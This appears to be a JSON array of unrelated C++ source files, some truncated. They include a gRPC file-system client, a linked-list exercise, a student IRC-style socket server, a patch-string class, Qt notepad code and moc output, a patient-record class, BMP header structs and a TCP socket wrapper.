[
    "#include <vector>\n#include <string>\n#include <thread>\n#include <cstdio>\n#include <chrono>\n#include <errno.h>\n#include <csignal>\n#include <iostream>\n#include <sstream>\n#include <fstream>\n#include <iomanip>\n#include <getopt.h>\n#include <unistd.h>\n#include <limits.h>\n#include <sys/inotify.h>\n#include <grpcpp/grpcpp.h>\n#include <utime.h>\n\n#include \"dfs-utils.h\"\n#include \"dfslibx-clientnode-p2.h\"\n\nusing grpc::Status;\nusing grpc::Channel;\nusing grpc::StatusCode;\nusing grpc::ClientWriter;\nusing grpc::ClientReader;\nusing grpc::ClientContext;\n\nextern dfs_log_level_e DFS_LOG_LEVEL;\n\nDFSClientNode::DFSClientNode() : mount_path(\"mnt/client/\"), unmounting(false), crc_table(CRC::CRC_32()) {\n    char host[HOST_NAME_MAX];\n    std::ostringstream ss_id;\n    gethostname(host, HOST_NAME_MAX);\n    auto t_id = std::this_thread::get_id();\n    ss_id << \"T\" << t_id;\n    client_id = std::string(host + ss_id.str());\n}\n\nDFSClientNode::~DFSClientNode() noexcept {}\n\nvoid DFSClientNode::Unmount() {\n    this->unmounting = true;\n}\n\nbool DFSClientNode::Unmounting() {\n    return this->unmounting;\n}\n\nconst std::string DFSClientNode::ClientId() {\n    return this->client_id;\n}\n\nvoid DFSClientNode::CreateStub(std::shared_ptr <Channel> channel) {\n    this->service_stub = dfs_service::DFSService::NewStub(channel);\n}\n\nvoid DFSClientNode::SetMountPath(const std::string &path) {\n    this->mount_path = path;\n}\n\nvoid DFSClientNode::SetDeadlineTimeout(int deadline) {\n    this->deadline_timeout = deadline;\n}\n\nvoid DFSClientNode::SetClientId(const std::string &id) {\n    this->client_id = id;\n}\n\nconst std::string DFSClientNode::MountPath() {\n    return this->mount_path;\n};\n\nstd::string DFSClientNode::WrapPath(const std::string &filepath) {\n    return this->mount_path + filepath;\n}\n\n",
    "//{ Driver Code Starts\n#include <bits/stdc++.h> \nusing namespace std; \n\nstruct Node\n{\n    int data;\n    struct Node* next;\n    \n    Node(int x){\n        data = x;\n        next = NULL;\n    }\n};\n\n\n// } Driver Code Ends\n/* Link list node */\n/*\nstruct Node\n{\n    int data;\n    Node* next;\n    Node(int x) {  data = x;  next = NULL; }\n}; */\n\nclass Solution\n{\n    public:\n    //Function to count nodes of a linked list.\n    int getCount(struct Node* head){\n        //Code here\n        Node* curr = head;\n        int count =0;\n        \n        while(curr!=NULL){\n            count++;\n            curr=curr->next;\n        }\n        return count;\n    }\n};\n    \n\n\n//{ Driver Code Starts.\n\nint main() \n{ \n    int t;\n    cin>>t;\n    while(t--)\n    {\n        int n;\n        cin>>n;\n\n        int data;\n        cin>>data;\n        struct Node *head = new Node(data);\n        struct Node *tail = head;\n        for (int i = 0; i < n-1; ++i)\n        {\n            cin>>data;\n            tail->next = new Node(data);\n            tail = tail->next;\n        }\n        Solution ob;\n        cout << ob.getCount(head) << endl;\n    }\n    return 0;\n}\n// } Driver Code Ends",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Server.cpp                                         :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: isouaidi <isouaidi@student.42nice.fr>      +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/07/04 14:13:39 by npatron           #+#    #+#             */\n/*   Updated: 2024/07/14 20:33:01 by isouaidi         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n\n#include \"Utils.hpp\"\n#include \"Server.hpp\"\n\n// MEMBER FUNCTIONS\n\nbool _loop = true;\n\nServer::Server() : _port(0), _nbClients(0), _password(\"NULL\")\n{\n\treturn ;\n}\n\nServer::~Server()\n{\n\treturn ;\n}\n\n// GETTERS / SETTERS\n\n// PORT\n\nunsigned int Server::getPort()\n{\n\treturn (this->_port);\n}\n\nvoid\tServer::setPort(unsigned int port)\n{\n\tthis->_port = port;\n\treturn ;\n}\n\n// PASSWORD\n\nstd::string Server::getPassword()\n{\n\treturn (this->_password);\n}\n\nvoid\tServer::setPassword(char *pass)\n{\n\tstd::string tmp_pass(pass);\n\tthis->_password = tmp_pass;\n\treturn ;\n}\n\n// SOCKET\n\nint\tServer::getSocket()\n{\n\treturn (this->_socket);\n}\n\nvoid\tServer::setSocket(int sock)\n{\n\tthis->_socket = sock;\n\treturn ;\n}\n\nvoid\tServer::launch_serv(char **av)\n{\n    struct protoent \t*proto;\n\tstruct sockaddr_in \tsin;\n\tproto = getprotobyname(\"tcp\");\n\tif (proto == 0)\n\t\treturn ;\n\tsetPort(atoi(av[1]));\n\tsetPassword(av[2]);\n\t_socket = socket(PF_INET, SOCK_STREAM, proto->p_proto);\n\tsin.sin_family = AF_INET;\n\tsin.sin_port = htons(_port);\n\tsin.sin_addr.s_addr = htonl(INADDR_ANY);\n\tbind(_socket, (const struct sockaddr*)&sin, sizeof(sin));\n\t\n\tlisten(_socket, 10);\n}\n\nvoid    Server::loop(char **av)\n{\n\tfd_set readfds;\n\tint max_sd;\n\tint cs;\n\tint connexion;\n\tchar buff[1024];\n\tint ret;\n\tClient *myClient = new Client();\n\t(void)myClient;\n\tlaunch_serv(av);\n\tprint_amazing();\n\tstd::cout << GRAS << \"Server launched\\n\" << std::endl;\n\twhile (true)\n\t{\n\t\tFD_ZERO(&readfds);\n\t\tFD_SET(_socket, &readfds);\n\t\tmax_sd = _socket;\n\t\tfor (size_t i = 0; i < _clientVector.size(); i++)\n\t\t{\n\t\t\tcs = _clientVector[i]->getSocket();\n\t\t\tif (cs > 0)\n\t\t\t\tFD_SET(cs, &readfds);\n\t\t\tif (cs > max_sd)\n\t\t\t\tmax_sd = cs;\n\t\t}\n\t\tconnexion = select(max_sd + 1, &readfds, NULL, NULL, NULL);\n\t\tif (connexion < 0)\n\t\t\tthrow(SelectError());\n\t\tif (FD_ISSET(_socket, &readfds)) // RECOIT UNE CONNEXION\n\t\t\tmyClient = AddClientToVector();\n\t\tfor (size_t i = 0; i < _clientVector.size(); i++)\n\t\t{\n\t\t\tcs = _clientVector[i]->getSocket();\n\t\t\tif (FD_ISSET(cs, &readfds))\n\t\t\t{\n\t\t\t\tret = recv(cs, buff, 1024, 0);\n\t\t\t\tbuff[ret] = '\\0';\n\t\t\t\tif (ret == 0)\n\t\t\t\t\tDeleteClientFromServ(i);\n\t\t\t\telse\n\t\t\t\t\tgetCmd(cs, std::string(buff));\n\t\t\t}\n\t\t}\n\t}\n\treturn ;\n}\n\nClient*\tServer::AddClientToVector()\n{\n\tClient *myClient = new Client();\n\tstruct sockaddr_in\tcsin;\n\tunsigned int\t \tcslen = sizeof(csin);\n\tint socket_client;\n\t\n\tsocket_client = accept(_socket, (struct sockaddr*)&csin, &cslen);\n\tif (socket_client < 0)\n\t\tthrow(AcceptError());\n\tmyClient->setSocket(socket_client);\n\t_clientVector.push_back(myClient);\n\t_nbClients++;\n\t_logger.logInfo(\"New client connection\");\n\treturn (myClient);\n}\n\nvoid\tServer::printClient()\n{\n\tfor (size_t i = 0; i < _clientVector.size(); i++)\n\t{\n\t\tstd::cout << \"FD : \" << _clientVector[i]->getSocket() << std::endl;\n\t\tif (_clientVector[i]->getBoolPass() == true)\n\t\t\tstd::cout << \"PASS: Valid.\" << std::endl;\n\t\telse\n\t\t\tstd::cout << \"PASS: Invalid.\" << std::endl;\n\t\tif (_clientVector[i]->getBoolNick() == true)\n\t\t\tstd::cout << \"NICK: Valid.\" << std::endl;\n\t\telse\n\t\t\tstd::cout << \"NICK: Invalid.\" << std::endl;\n\t\t\n\t\tif (_clientVector[i]->getBoolUser() == true)\n\t\t\tstd::cout << \"USER: Valid.\" << std::endl;\n\t\telse\n\t\t\tstd::cout << \"USER: Invalid.\" << std::endl;\n\t}\n\treturn ;\n}\n\nstd::string Server::stockCtrl(std::string msg){\n\tstd::string msgR;\n\tif (_ctrl.empty()){\n\t\t_ctrl = msg;\n\t}\n\telse{\n\t\t_ctrl = _ctrl + msg;\t\t\n\t}\n\t\n\tif (_ctrl[_ctrl.length() - 1] == '\\n'){\n\t\t_ctrl = _ctrl.substr(0, _ctrl.size() - 1);\n\t\tmsgR = _ctrl;\n\t\t_ctrl.clear();\n\t}\n\treturn (msgR);\n}\n\nvoid\tServer::getCmd(int fd, std::string msg)\n{\n\tstd::vector<std::string> vectorInput;\n\tstd::string delimiter = \"\\r\\n\";\n\tsize_t ret;\n\tret = msg.find(delimiter);\n\tif (ret == std::string::npos)\n\t{\n\t\tmsg = stockCtrl(msg);\n\t\tif (!(msg.empty())){\n\t\t\t_logger.logInput(msg);\n\t\t\tvectorInput.push_back(msg);\n\t\t}\n\t}\n\telse\n\t{\n\t\t_logger.logInput(msg);\n\t\twhile ((ret = msg.find(delimiter)) != std::string::npos)\n\t\t{\n\t\t\tstd::string lineToAdd = msg.substr(0, ret);\n\t\t\tmsg = msg.substr(ret  + delimiter.length());\n\t\t\tvectorInput.push_back(lineToAdd);\n\t\t}\n\t\tvectorInput.push_back(msg);\n\t}\n\ttreatVectorCmd(fd, vectorInput);\n\treturn ;\n}\n\nstd::vector",
    "#ifndef __PROGTEST__\n#include <cstring>\n#include <cstdlib>\n#include <cstdio>\n#include <cassert>\n#include <cmath>\n#include <iostream>\n#include <iomanip>\n#include <memory>\n#include <stdexcept>\n#endif /* __PROGTEST__ */\n\n\nstruct StringEntry {\n    std::shared_ptr<char> str;\n    size_t length;\n\n    // Constructor\n    StringEntry(const char* s) : str(new char[std::strlen(s) + 1], std::default_delete<char[]>()), length(std::strlen(s)) {\n        std::strcpy(str.get(), s);\n    }\n};\n\n\n\nclass CPatchStr\n{\n  public:\n    CPatchStr() : m_segments(nullptr), m_segmentCount(0) {}\n\n    CPatchStr(const char * str) {\n        m_segmentCount = 1;\n        m_segments = new StringList[m_segmentCount];\n        m_segments[0].ptr = std::make_shared<StringEntry>(str);\n        m_segments[0].ofs = 0;\n        m_segments[0].len = static_cast<int>(strlen(str));\n    }\n\n    CPatchStr(const CPatchStr& other) : m_segments(new StringList[other.m_segmentCount]), m_segmentCount(other.m_segmentCount) {\n        for (size_t i = 0; i < m_segmentCount; ++i) {\n            m_segments[i].ptr = other.m_segments[i].ptr;\n            m_segments[i].ofs = other.m_segments[i].ofs;\n            m_segments[i].len = other.m_segments[i].len;\n        }\n    }\n\n    // Destructor\n    ~CPatchStr() {\n        delete[] m_segments;\n    }\n\n    // Copy assignment operator\n    CPatchStr& operator=(const CPatchStr& other) {\n        if (this != &other) {\n            delete[] m_segments;\n\n            m_segmentCount = other.m_segmentCount;\n            m_segments = new StringList[other.m_segmentCount];\n            for (size_t i = 0; i < m_segmentCount; ++i) {\n                m_segments[i].ptr = other.m_segments[i].ptr;\n                m_segments[i].ofs = other.m_segments[i].ofs;\n                m_segments[i].len = other.m_segments[i].len;\n            }\n        }\n        return *this;\n    }\n\n    CPatchStr   subStr    ( size_t            from,\n                            size_t            len ) const;\n    CPatchStr & append    ( const CPatchStr & src );\n\n    CPatchStr & insert    ( size_t            pos,\n                            const CPatchStr & src );\n    CPatchStr & remove    ( size_t            from,\n                            size_t            len );\n    char      * toStr     () const;\n  public:\n    struct StringList {\n        int ofs;\n        int len;\n        std::shared_ptr<StringEntry> ptr;\n    };\n    StringList * m_segments;\n    size_t m_segmentCount;\n  private:\n    size_t totalLength() const {\n        size_t total = 0;\n        for (size_t i = 0; i < m_segmentCount; ++i) {\n            total += m_segments[i].len;\n        }\n        return total;\n    }\n};\n\n\nchar * CPatchStr::toStr() const {\n    std::ostringstream oss;\n    for (size_t i = 0; i < m_segmentCount; ++i) {\n        StringList &seg = m_segments[i];\n        if (seg.ptr) {  // Ensure the pointer is valid\n            // Append the substring to the output stream\n            oss.write(seg.ptr->str.get() + seg.ofs, seg.len);\n        }\n    }\n\n    // Convert stream to string and then to C-style string\n    std::string temp = oss.str();\n    char* result = new char[temp.length() + 1];\n    std::strcpy(result, temp.c_str());\n    return result;\n}\n\nCPatchStr & CPatchStr::append(const CPatchStr & src) {\n    if (this == &src) {  // Handle self-assignment\n        CPatchStr temp(src);  // Make a copy to work with\n        return append(temp);  // Append the copy\n    }\n\n    size_t newSegmentCount = m_segmentCount + src.m_segmentCount;\n    StringList* newSegments = new StringList[newSegmentCount];\n\n    // Copy existing segments to the new array\n    for (size_t i = 0; i < m_segmentCount; ++i) {\n        newSegments[i] = m_segments[i];\n    }\n\n    // Append new segments from src\n    for (size_t i = 0; i < src.m_segmentCount; ++i) {\n        newSegments[m_segmentCount + i] = src.m_segments[i];\n    }\n\n    delete[] m_segments;  // Delete old segment array\n    m_segments = newSegments;  // Assign the new segment array\n    m_segmentCount = newSegmentCount;\n\n    return *this;\n}\n\nCPatchStr CPatchStr::subStr(size_t from, size_t len) const {\n    if (from + len > totalLength()) {\n        throw std::out_of_range(\"Starting position out of range\");\n    }\n\n    CPatchStr result;\n    size_t endPos = from + len;\n    size_t currentPos = 0;\n\n    // Find and allocate only necessary segments for the substring\n    for (size_t i = 0; i < m_segmentCount && currentPos < endPos; ++i) {\n        size_t segmentFullStart = currentPos;\n        size_t segmentFullEnd = currentPos + m_segments[i].len;\n        currentPos = segmentFullEnd;  // Prepare currentPos for the next loop iteration\n\n        // Check if the segment falls within the substring range\n        if (segmentFullEnd > from && segmentFullStart < endPos) {\n            size_t segmentStart = (from > segmentFullStart) ? from - segmentFullStart : 0;\n            size_t segmentEnd = (endPos < segmentFullEnd) ? endPos - segmentFullStart : m_segments[i].len;\n\n            if (result.m_segmentCount == 0) {\n                // A",
    "/****************************************************************************\r\n** Meta object code from reading C++ file 'mainwindow.h'\r\n**\r\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.2.4)\r\n**\r\n** WARNING! All changes made in this file will be lost!\r\n*****************************************************************************/\r\n\r\n#include <memory>\r\n#include \"../../Notepad/mainwindow.h\"\r\n#include <QtCore/qbytearray.h>\r\n#include <QtCore/qmetatype.h>\r\n#if !defined(Q_MOC_OUTPUT_REVISION)\r\n#error \"The header file 'mainwindow.h' doesn't include <QObject>.\"\r\n#elif Q_MOC_OUTPUT_REVISION != 68\r\n#error \"This file was generated using the moc from 6.2.4. It\"\r\n#error \"cannot be used with the include files from this version of Qt.\"\r\n#error \"(The moc has changed too much.)\"\r\n#endif\r\n\r\nQT_BEGIN_MOC_NAMESPACE\r\nQT_WARNING_PUSH\r\nQT_WARNING_DISABLE_DEPRECATED\r\nstruct qt_meta_stringdata_MainWindow_t {\r\n    const uint offsetsAndSize[30];\r\n    char stringdata0[338];\r\n};\r\n#define QT_MOC_LITERAL(ofs, len) \\\r\n    uint(offsetof(qt_meta_stringdata_MainWindow_t, stringdata0) + ofs), len \r\nstatic const qt_meta_stringdata_MainWindow_t qt_meta_stringdata_MainWindow = {\r\n    {\r\nQT_MOC_LITERAL(0, 10), // \"MainWindow\"\r\nQT_MOC_LITERAL(11, 23), // \"on_actionCopy_triggered\"\r\nQT_MOC_LITERAL(35, 0), // \"\"\r\nQT_MOC_LITERAL(36, 24), // \"on_actionPaste_triggered\"\r\nQT_MOC_LITERAL(61, 22), // \"on_actionCut_triggered\"\r\nQT_MOC_LITERAL(84, 23), // \"on_actionUndo_triggered\"\r\nQT_MOC_LITERAL(108, 23), // \"on_actionRedo_triggered\"\r\nQT_MOC_LITERAL(132, 27), // \"on_actionNew_File_triggered\"\r\nQT_MOC_LITERAL(160, 28), // \"on_actionOpen_File_triggered\"\r\nQT_MOC_LITERAL(189, 24), // \"on_actionAbout_triggered\"\r\nQT_MOC_LITERAL(214, 23), // \"on_actionSave_triggered\"\r\nQT_MOC_LITERAL(238, 26), // \"on_actionSave_As_triggered\"\r\nQT_MOC_LITERAL(265, 25), // \"on_actionExit_3_triggered\"\r\nQT_MOC_LITERAL(291, 24), // \"on_actionClear_triggered\"\r\nQT_MOC_LITERAL(316, 21) // \"on_screen_textChanged\"\r\n\r\n    },\r\n    \"MainWindow\\0on_actionCopy_triggered\\0\\0\"\r\n    \"on_actionPaste_triggered\\0\"\r\n    \"on_actionCut_triggered\\0on_actionUndo_triggered\\0\"\r\n    \"on_actionRedo_triggered\\0\"\r\n    \"on_actionNew_File_triggered\\0\"\r\n    \"on_actionOpen_File_triggered\\0\"\r\n    \"on_actionAbout_triggered\\0\"\r\n    \"on_actionSave_triggered\\0\"\r\n    \"on_actionSave_As_triggered\\0\"\r\n    \"on_actionExit_3_triggered\\0\"\r\n    \"on_actionClear_triggered\\0on_screen_textChanged\"\r\n};\r\n#undef QT_MOC_LITERAL\r\n\r\nstatic const uint qt_meta_data_MainWindow[] = {\r\n\r\n // content:\r\n      10,       // revision\r\n       0,       // classname\r\n       0,    0, // classinfo\r\n      13,   14, // methods\r\n       0,    0, // properties\r\n       0,    0, // enums/sets\r\n       0,    0, // constructors\r\n       0,       // flags\r\n       0,       // signalCount\r\n\r\n // slots: name, argc, parameters, tag, flags, initial metatype offsets\r\n       1,    0,   92,    2, 0x08,    1 /* Private */,\r\n       3,    0,   93,    2, 0x08,    2 /* Private */,\r\n       4,    0,   94,    2, 0x08,    3 /* Private */,\r\n       5,    0,   95,    2, 0x08,    4 /* Private */,\r\n       6,    0,   96,    2, 0x08,    5 /* Private */,\r\n       7,    0,   97,    2, 0x08,    6 /* Private */,\r\n       8,    0,   98,    2, 0x08,    7 /* Private */,\r\n       9,    0,   99,    2, 0x08,    8 /* Private */,\r\n      10,    0,  100,    2, 0x08,    9 /* Private */,\r\n      11,    0,  101,    2, 0x08,   10 /* Private */,\r\n      12,    0,  102,    2, 0x08,   11 /* Private */,\r\n      13,    0,  103,    2, 0x08,   12 /* Private */,\r\n      14,    0,  104,    2, 0x08,   13 /* Private */,\r\n\r\n // slots: parameters\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n    QMetaType::Void,\r\n\r\n       0        // eod\r\n};\r\n\r\nvoid MainWindow::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\r\n{\r\n    if (_c == QMetaObject::InvokeMetaMethod) {\r\n        auto *_t = static_cast<MainWindow *>(_o);\r\n        (void)_t;\r\n        switch (_id) {\r\n        case 0: _t->on_actionCopy_triggered(); break;\r\n        case 1: _t->on_actionPaste_triggered(); break;\r\n        case 2: _t->on_actionCut_triggered(); break;\r\n        case 3: _t->on_actionUndo_triggered(); break;\r\n        case 4: _t->on_actionRedo_triggered(); break;\r\n        case 5: _t->on_actionNew_File_triggered(); break;\r\n        case 6: _t->on_actionOpen_File_triggered(); break;\r\n        case 7: _t->on_actionAbout_triggered(); break;\r\n        case 8: _t->on_actionSave_triggered(); break;\r\n        case 9: _t->on_actionSave_As_triggered(); break;\r\n        case 10: _t->on_actionExit_3_triggered(); break;\r\n        case 11: _t->on_actionClear_triggered(); break;\r\n        case 12: _t->on_screen_textChanged(); break;\r\n        default: ;\r\n        }\r\n    }\r\n    (void)_a;\r\n}\r\n\r\nconst QMetaObject MainWindow::staticMetaObject = { ",
    "//\n// Created by User on 6/30/2024.\n//\n\n#include \"AmbulantniPacijent.h\"\n\nAmbulantniPacijent::AmbulantniPacijent(std::string &ime, std::string &prezime, int starost, std::string &dijagnoza,\n                                       std::string &datumPregleda, std::string &imeDoktora)\n                                       : Pacijent(ime,prezime,starost,dijagnoza),datumPregleda(datumPregleda), imeDoktora(imeDoktora){}\n\nstring AmbulantniPacijent::getDatumPregleda() const {\n    return this->datumPregleda;\n}\n\nstring AmbulantniPacijent::getImeDoktora() const {\n    return this->imeDoktora;\n}\n\nvoid AmbulantniPacijent::prikaziDetalje(){\n    cout << \"Detalji o pacijentu:\" << endl;\n    cout << \"Ime: \" << this->ime << endl;\n    cout << \"Prezime: \" << this->prezime << endl;\n    cout << \"Starost: \" << this->starost << endl;\n    cout << \"Dijagnoza: \" << this->dijagnoza << endl;\n    cout << \"Datum pregleda: \" << this->datumPregleda << endl;\n    cout << \"Ime doktora: \" << this->imeDoktora << endl;\n}\n\nostream& operator>>(ostream& os, const AmbulantniPacijent& ambulantniPacijent){\n    ofstream outFile(\"AmbulantniPacijenti.txt\", ios::app);\n\n    if(outFile.is_open()){\n        outFile << \"Ime: \" << ambulantniPacijent.getIme() << endl;\n        outFile << \"Prezime: \" << ambulantniPacijent.getPrezime() << endl;\n        outFile << \"Starost: \" << ambulantniPacijent.getStarost() << endl;\n        outFile << \"Dijagnoza: \" << ambulantniPacijent.getDijagnoza() << endl;\n        outFile << \"Datum pregleda: \" << ambulantniPacijent.getDatumPregleda() << endl;\n        outFile << \"Ime doktora: \" << ambulantniPacijent.getImeDoktora() << endl;\n        outFile.close();\n    } else {\n        cerr << \"Nije moguce otvoriti fajl.\" << endl;\n    }\n    return os;\n}",
    "#ifndef __BITMAP_CPP_\n#define __BITMAP_CPP_\n\n#include <stdint.h>\n\n#include \"./bitmap.h\"\n\ntypedef struct Bitmap {\n  unsigned width;\n  unsigned height;\n} Bitmap;\n\n/**\n * @brief cabe\u00e7alho do arquivo - cont\u00e9m informa\u00e7\u00e3o sobre o arquivo\n * @link https://en.wikipedia.org/wiki/BMP_file_format\n */\ntypedef struct Bitmap_File_Header {\n  uint8_t header[2];\n  uint32_t size;\n  uint16_t application_specific;\n  uint16_t application_specific2;\n  uint32_t offset;\n} Bitmap_File_Header;\n\nconst unsigned BITMAP_FILE_HEADER_SIZE = 14;\n\n/**\n * @brief DIB Header - Device-Independent Bitmap\n * @todo Jo\u00e3o, implementar\n */\ntypedef struct DIB_Header {\n  /**\n   * @brief N\u00famero de bytes do header\n   */\n  uint32_t size;\n  uint32_t image_width;\n  uint32_t image_height;\n  uint16_t number_of_colors_planes;\n  uint16_t n_bit_per_pixel;\n  /**\n   * @brief Cont\u00e9m a informa\u00e7\u00e3o do m\u00e9todo de compress\u00e3o.\n   * Um dos valores do enum 'Compression_Method' \n   */\n  uint32_t bitfield;\n  /**\n   * @brief Tamanho dos dados de imagem em bytes incluindo padding\n   */\n  uint32_t size_of_data;\n  uint32_t print_resolution_horizontal;\n  uint32_t print_resolution_vertical;\n  uint32_t n_colors_in_palette;\n  uint32_t important_colors;\n\n} DIB_Header;\n\ntypedef enum Compression_Method {\n  BI_RGB = 0, // sem compress\u00e3o\n  BI_RLE8 = 1,\n  BI_RLE4 = 2,\n  BI_BITFIELDS = 3,\n  BI_JPEG = 4,\n  BI_PNG = 5,\n  BI_ALPHABITFIELDS = 6,\n  BI_CMYK = 11,\n  BI_CMYKRLE8 = 12,\n  BI_CMYKRLE4 = 13,\n} Compression_Method;\n\n#endif // __BITMAP_CPP_\n",
    "#include \"MySocket.h\"\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <unistd.h>\n#include <string.h>\n#include <netdb.h>\n#include <netinet/in.h>\n#include <string>\n\n#include <iostream>\n\nusing namespace std;\n\nMySocket::MySocket(const char *inetAddr, int port) {\n  call_connect(inetAddr, port);\n}\n\nvoid MySocket::call_connect(const char *inetAddr, int port) {\n    struct sockaddr_in server;\n    struct addrinfo hints;\n    struct addrinfo *res;\n\n    // set up the new socket (TCP/IP)\n    sockFd = socket(AF_INET,SOCK_STREAM,0);\n    \n    memset(&hints, 0, sizeof(hints));\n    hints.ai_family = AF_INET;\n    hints.ai_socktype = SOCK_STREAM;\n    int ret = getaddrinfo(inetAddr, NULL, &hints, &res);\n    if(ret != 0) {\n        string str;\n        str = string(\"Could not get host \") + string(inetAddr);\n        throw SocketError(str.c_str());\n    }\n    \n    server.sin_addr = ((struct sockaddr_in *) (res->ai_addr))->sin_addr;\n    server.sin_port = htons((short) port);\n    server.sin_family = AF_INET;\n    freeaddrinfo(res);\n    \n    // conenct to the server\n    if( connect(sockFd, (struct sockaddr *) &server,\n                sizeof(server)) == -1 ) {\n        throw SocketError(\"Did not connect to the server\");\n    }\n}\n\nMySocket::MySocket(void) {\n    sockFd = -1;\n}\n\nMySocket::MySocket(int socketFileDesc) {\n    sockFd = socketFileDesc;\n}\n\nMySocket::~MySocket(void) {\n    close();\n}\n\n\nvoid MySocket::write(string buffer) {\n    write_bytes(buffer.c_str(), buffer.size());\n}\n\nvoid MySocket::write_bytes(const void *buffer, int len) {\n    const unsigned char *buf = (const unsigned char *) buffer;\n    int bytesWritten = 0;\n\n    if (sockFd<0) {\n      throw SocketNotConnected();\n    }\n\n    while(len > 0) {\n        bytesWritten = ::write(sockFd, buf, len);\n        if(bytesWritten <= 0) {\n\t  throw SocketWriteError();\n        }\n        buf += bytesWritten;\n        len -= bytesWritten;\n    }\n}\n\nstring MySocket::read() {\n    char buffer[4096];\n    if(sockFd<0) {\n      throw SocketNotConnected();\n    }\n    \n    int ret = ::read(sockFd, buffer, sizeof(buffer));\n    \n    if(ret <= 0) {\n      throw SocketReadError();\n    }\n  \n    return string(buffer, ret);\n}\n\nvoid MySocket::close(void) {\n    if(sockFd<0) return;\n    \n    ::close(sockFd);\n\n    sockFd = -1;\n}\n",
    "#include \"mainwindow.h\"\r\n#include \"ui_mainwindow.h\"\r\n\r\nMainWindow::MainWindow(QWidget *parent)\r\n    : QMainWindow(parent)\r\n    , ui(new Ui::MainWindow)\r\n{\r\n    ui->setupUi(this);\r\n    ui->displaylabel->hide();\r\n    QMainWindow mainWindow;\r\n\r\n}\r\n\r\nMainWindow::~MainWindow()\r\n{\r\n    delete ui;\r\n}\r\n\r\nvoid MainWindow::on_actionNew_File_triggered()\r\n{\r\n    qDebug()<<\"Clicked New File Icon\";\r\n\r\n    // QString fileName = \"C:/Users/Sivasai/Desktop/SivaQT/QMenu/QMenu/hello.txt\"; // Replace with your desired file path for statically giving the filename.\r\n\r\n\r\n    // Ask user for file name\r\n    QString directory = \"./TextDocuments/\"; // Relative directory path\r\n\r\n    // Create directory if it doesn't exist\r\n    QDir dir(directory);\r\n    if (!dir.exists()) {\r\n        if (!dir.mkpath(\".\")) {\r\n            qDebug() << \"Failed to create directory:\" << directory;\r\n        }\r\n        qDebug() << \"Directory created:\" << directory;\r\n    }\r\n\r\n\r\n\r\n    // Taking input of the filename with extension of the file.\r\n    QString fileName = QInputDialog::getText(this, \"Enter File Name with extension of the file\", \"File Name:\");\r\n    // Checking if the name of the file is empty or not.\r\n    if(!fileName.isEmpty())\r\n    {\r\n        QString totalfilepath = directory+fileName ;\r\n        qDebug()<<totalfilepath;\r\n\r\n        // Ask user for file content\r\n        QString fileContent = QInputDialog::getText(this, \"Enter File Content\", \"File Content:\");\r\n        qDebug()<<fileContent;\r\n        QFile file(totalfilepath);\r\n\r\n        if (file.open(QIODevice::WriteOnly | QIODevice::Text))\r\n        {\r\n            QTextStream stream(&file);\r\n            stream << fileContent;\r\n            file.close();\r\n\r\n            qDebug() << \"File created successfully in location : \" << totalfilepath;\r\n            QMessageBox::information(this, \"Success\", \"File created successfully.\");\r\n        }\r\n        else\r\n        {\r\n            qDebug() << \"Could not create file: \" << totalfilepath;\r\n            QMessageBox::critical(this, \"Error\", \"Could not create file.\");\r\n        }\r\n    }\r\n    else\r\n    {\r\n        QMessageBox::warning(this, \"Error\", \"Filepath or  Filename cannot be empty.\");\r\n    }\r\n\r\n\r\n\r\n}\r\n\r\n\r\n\r\nvoid MainWindow::on_actionOpen_File_triggered()\r\n{\r\n    //To open the directory and to see the files and access the files.\r\n    QString filePath = QFileDialog::getOpenFileName(nullptr,\r\n                                                    QObject::tr(\"Open File\"),\r\n                                                    QDir::currentPath(),\r\n                                                    QObject::tr(\"All Files (*)\"));\r\n\r\n    QString fileContent;\r\n\r\n    // Checking the file is selected or not , if selected then the condition applies.\r\n    if (!filePath.isEmpty()) {\r\n        qDebug() << \"Selected file:\" << filePath;\r\n\r\n        QFile file(filePath);\r\n        if (file.open(QIODevice::ReadOnly | QIODevice::Text)) {\r\n            QTextStream in(&file);\r\n            fileContent = in.readAll();\r\n            qDebug().noquote() << \"File content:\";\r\n            qDebug().noquote() << fileContent;\r\n\r\n            // Display file content in a message box\r\n            QMessageBox::information(nullptr, \"File Content\", fileContent);\r\n\r\n\r\n            // Assigning and Displaying the content in the UI.\r\n            ui->displaylabel->setText(\"<h1> File path : </h1>\"+filePath);\r\n            ui->displaydata->setPlainText(fileContent);\r\n            ui->displaylabel->show();\r\n            ui->displaydata->show();\r\n\r\n\r\n            file.close();\r\n        } else {\r\n            qDebug() << \"Failed to open file:\" << filePath;\r\n            QMessageBox::critical(nullptr, \"Error\", \"Failed to open file.\");\r\n        }\r\n    } else {\r\n        qDebug() << \"No file selected.\";\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\nvoid MainWindow::on_actionExit_File_triggered()\r\n{\r\n    QCoreApplication::exit();\r\n}\r\n\r\n\r\nvoid MainWindow::on_Readdatabutton_clicked()\r\n{\r\n    //To open the directory and to see the files and access the files.\r\n    QString filePath = QFileDialog::getOpenFileName(nullptr,\r\n                                                    QObject::tr(\"Open File\"),\r\n                                                    QDir::currentPath(),\r\n                                                    QObject::tr(\"All Files (*)\"));\r\n\r\n    QString fileContent;\r\n\r\n    // Checking the file is selected or not , if selected then the condition applies.\r\n    if (!filePath.isEmpty()) {\r\n        qDebug() << \"Selected file:\" << filePath;\r\n\r\n        QFile file(filePath);\r\n        if (file.open(QIODevice::ReadOnly | QIODevice::Text)) {\r\n            QTextStream in(&file);\r\n            fileContent = in.readAll();\r\n            qDebug().noquote() << \"File content:\";\r\n            qDebug().noquote() << fileContent;\r\n\r\n            // Display file content in a message box\r\n            QMessageBox::information(nullptr, \"File Content\", fileContent);\r\n\r\n\r\n            // Assigning and Displaying the content in the UI.\r\n            ui->displaylabel->setText(\"<h1> Fil",
